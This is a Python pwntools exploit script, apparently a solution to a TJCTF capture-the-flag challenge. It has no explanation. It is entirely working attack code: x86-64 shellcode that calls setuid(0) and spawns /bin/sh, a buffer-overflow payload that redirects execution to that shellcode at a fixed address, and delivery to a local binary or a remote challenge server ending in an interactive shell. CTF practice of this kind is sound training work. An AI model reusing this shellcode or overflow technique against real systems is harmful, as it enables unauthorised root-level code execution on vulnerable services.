#!/usr/bin/env python
# -*- coding: utf-8 -*-
__Auther__ = 'L1B0'

from pwn import *
from sys import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c' ]

if argv[1] == 'l':
	io = process('./problem')
else:
	io = remote('problem1.tjctf.org', 8005)


shellcode = "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\0"
#print len(shellcode)

print len(shellcode)
name_addr = 0x6010A0
payload = '6666' + 'a'*0x13 + p64(name_addr)
	
io.sendlineafter(": ",shellcode)
io.sendlineafter(': ','6666')
	
io.sendlineafter('?','d')
io.sendline(payload)

io.interactive()
